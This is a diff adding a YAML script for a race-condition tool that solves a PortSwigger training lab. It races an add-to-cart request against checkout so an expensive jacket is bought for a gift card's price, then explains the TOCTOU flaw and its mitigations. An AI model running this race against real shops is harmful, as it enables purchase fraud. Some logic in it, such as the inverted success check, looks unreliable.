@@ -1,0 +1,310 @@
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Multi-Endpoint Race Condition
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#
+# PortSwigger Lab: Multi-endpoint race conditions
+# https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint
+#
+# Exploits race window between adding item to cart and checkout validation.
+# By racing POST /cart (add jacket) with POST /cart/checkout (buy gift card),
+# we can purchase expensive jacket for gift card price.
+#
+# Setup:
+#   export LAB_HOST="0a1b2c3d.web-security-academy.net"
+#   treco attack.yaml
+#
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+metadata:
+  name: "Multi-Endpoint Race Condition"
+  version: "1.0"
+  author: "Security Researcher"
+  vulnerability: "CWE-367: Time-of-check Time-of-use (TOCTOU)"
+  description: |
+    Exploits race condition between cart modification and checkout validation.
+    By sending POST /cart and POST /cart/checkout simultaneously, we can add
+    an expensive item during the payment validation window, effectively
+    purchasing it for the price of the item originally in cart.
+
+target:
+  host: "{{ env('LAB_HOST') }}"
+  port: 443
+  http:
+    follow_redirects: false
+  tls:
+    enabled: true
+    verify_cert: false
+  proxy:
+    type: http
+    host: 127.0.0.1
+    port: 8080
+
+entrypoint:
+  state: login
+  input:
+    username: "wiener"
+    password: "peter"
+    gift_card_id: "2"      # $10 gift card
+    jacket_id: "1"         # $1337 Lightweight L33t Leather Jacket
+
+states:
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 1: Login
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  login:
+    description: "Authenticate as wiener"
+    
+    request: |
+      GET /login HTTP/1.1
+      Host: {{ target.host }}
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      Connection: close
+    
+    extract:
+      csrf_token:
+        type: xpath
+        pattern: '//input[@name="csrf"]/@value'
+      
+      session:
+        type: cookie
+        pattern: session
+    
+    logger:
+      on_state_leave: |
+        🔐 Session: {{ login.session }}...
+        🎫 CSRF: {{ login.csrf_token[:16] }}...
+    
+    next:
+      - on_status: 200
+        goto: do_login
+
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 2: Submit Login
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  do_login:
+    description: "Submit credentials"
+    
+    request: |
+      POST /login HTTP/1.1
+      Host: {{ target.host }}
+      Cookie: session={{ login.session }}
+      Content-Type: application/x-www-form-urlencoded
+      Connection: close
+      
+      csrf={{ login.csrf_token }}&username={{ username }}&password={{ password }}
+    
+    extract:
+      session:
+        type: cookie
+        pattern: session
+    
+    logger:
+      on_state_leave: |
+        ✅ Logged in as {{ username }}
+        💰 Ready to exploit cart race condition
+    
+    next:
+      - on_status: [200, 302]
+        goto: add_gift_card
+
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 3: Add Gift Card to Cart (Setup)
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  add_gift_card:
+    description: "Add $10 gift card to cart (bait item)"
+    
+    request: |
+      POST /cart HTTP/1.1
+      Host: {{ target.host }}
+      Cookie: session={{ do_login.session }}
+      Content-Type: application/x-www-form-urlencoded
+      Connection: close
+      
+      productId={{ gift_card_id }}&redir=PRODUCT&quantity=1
+    
+    logger:
+      on_state_leave: |
+        🎁 Gift card added to cart ($10)
+        🎯 Now racing: Add jacket + Checkout simultaneously
+    
+    next:
+      - on_status: [200, 302]
+        goto: get_cart_csrf
+
+
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 4: Get Cart CSRF Token (Required for Checkout)
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  get_cart_csrf:
+    description: "Extract CSRF token from cart page"
+    
+    request: |
+      GET /cart HTTP/1.1
+      Host: {{ target.host }}
+      Cookie: session={{ do_login.session }}
+      Connection: close
+    
+    extract:
+      csrf_checkout:
+        type: xpath
+        pattern: '//input[@name="csrf"]/@value'
+    
+    logger:
+      on_state_leave: |
+        🎫 Checkout CSRF: {{ get_cart_csrf.csrf_checkout[:16] }}...
+        🎯 Ready to race: Add jacket + Checkout simultaneously
+    
+    next:
+      - on_status: 200
+        goto: race_multi_endpoint
+
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 4: RACE ATTACK - Multi-Endpoint
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  race_multi_endpoint:
+    description: "Race: Add jacket to cart while checking out"
+    
+    # Different requests per thread
+    input:
+      endpoint:
+        - /cart
+        - /cart/checkout
+      body:
+        - "productId={{ jacket_id }}&redir=PRODUCT&quantity=1"
+        - "csrf={{ get_cart_csrf.csrf_checkout }}"
+    
+    race:
+      threads: 2
+      sync_mechanism: barrier
+      connection_strategy: multiplexed
+      thread_propagation: single
+      input_mode: distribute
+    
+    request: |
+      POST {{ thread.input.endpoint }} HTTP/1.1
+      Host: {{ target.host }}
+      Cookie: session={{ do_login.session }}
+      {% if thread.input.body -%}
+      Content-Type: application/x-www-form-urlencoded
+      {% endif %}
+      Connection: close
+
+      {{ thread.input.body | replace("XYZ", "productId={{ jacket_id }}&redir=PRODUCT&quantity=1") }}
+    
+    logger:
+      on_thread_enter: |
+        🚀 [Thread {{ thread.id + 1 }}] {{ thread.input.method }} {{ thread.input.endpoint }}
+      
+      on_thread_leave: |
+        {% if response.status_code in [200, 302] %}
+        ✅ [Thread {{ thread.id + 1 }}] Success: {{ thread.input.endpoint }} ({{ timing_ms }}ms)
+        {% else %}
+        ❌ [Thread {{ thread.id + 1 }}] Failed: HTTP {{ response.status_code }}
+        {% endif %}
+      
+      on_state_leave: |
+        
+        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        🎯 Multi-Endpoint Race Complete!
+        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        
+        📊 Attack Flow:
+           Thread 1: POST /cart (add $1337 jacket)
+           Thread 2: POST /cart/checkout (process $10 gift card)
+        
+        💡 If successful:
+           • Jacket added during payment validation window
+           • Checkout processed with original $10 price
+           • Purchased $1337 jacket for $10! 🎉
+        
+        🌐 Next Steps:
+        
+        1. Check if order was successful:
+           Visit: https://{{ target.host }}/cart
+        
+        2. If jacket is in cart but not purchased:
+           → Run attack again (timing was off)
+        
+        3. If jacket was purchased:
+           → Lab solved! Check "My Account" → "Order History"
+        
+        4. If insufficient funds error:
+           → Run attack multiple times until successful
+        
+        ⏱️  Timing Analysis:
+           • Both endpoints should complete within ~50ms window
+           • POST /cart/checkout validates cart state BEFORE locking
+           • POST /cart modifies cart DURING validation
+           • Result: TOCTOU vulnerability! ⚡
+    
+    next:
+      - on_status: [200, 302]
+        goto: verify_purchase
+
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 5: Verify Purchase
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  verify_purchase:
+    description: "Check if jacket was purchased"
+    
+    request: |
+      GET /cart HTTP/1.1
+      Host: {{ target.host }}
+      Cookie: session={{ do_login.session }}
+      Connection: close
+    
+    logger:
+      on_state_leave: |
+        
+        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        ✅ Attack Complete
+        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        
+        🔍 Verification:
+        
+        {% if "Lightweight l33t Leather Jacket" in response.text %}
+        🎉 SUCCESS! Jacket still in cart (not yet purchased)
+           → Remove from cart and try again
+        {% else %}
+        ✅ EXPLOITED! Cart is empty - jacket was purchased!
+           → Check "My Account" for order confirmation
+           → Lab should be solved! 🏆
+        {% endif %}
+        
+        📊 Why This Works:
+        
+        Attack Timeline:
+        ┌────────────────────────────────────────────────────────────────┐
+        │ T=0ms:   Both threads hit barrier                              │
+        │ T=1ms:   POST /cart/checkout starts validation                 │
+        │          ├─ Reads cart: [gift_card]                            │
+        │          ├─ Validates price: $10 ✓                             │
+        │          └─ [RACE WINDOW OPEN] ⚡                               │
+        │ T=2ms:   POST /cart adds jacket to cart                        │
+        │          └─ Cart now: [gift_card, jacket]                      │
+        │ T=3ms:   POST /cart/checkout completes                         │
+        │          └─ Processes with OLD cart state ($10) ✓              │
+        │ Result:  Purchased jacket + gift card for $10! 🎯              │
+        └────────────────────────────────────────────────────────────────┘
+        
+        Vulnerable Code Pattern:
+        ┌────────────────────────────────────────────────────────────────┐
+        │ def checkout():                                                │
+        │     cart = get_cart(session)      # ← Read cart state         │
+        │     price = calculate_price(cart) # ← Calculate from snapshot │
+        │     # [RACE WINDOW] ⚡                                          │
+        │     validate_payment(price)       # ← Check affordability     │
+        │     # cart might be modified here!                             │
+        │     finalize_order(cart)          # ← Process current cart    │
+        │                                                                │
+        │ # Missing: Lock cart during checkout!                          │
+        └────────────────────────────────────────────────────────────────┘
+        
+        💡 Mitigation:
+           • Lock cart when checkout begins
+           • Re-validate cart state before finalizing
+           • Use database transactions with proper isolation
+           • Atomic read-modify-write operations
+        
+        🏆 If lab is not solved, run attack again (timing sensitivity ~50ms)
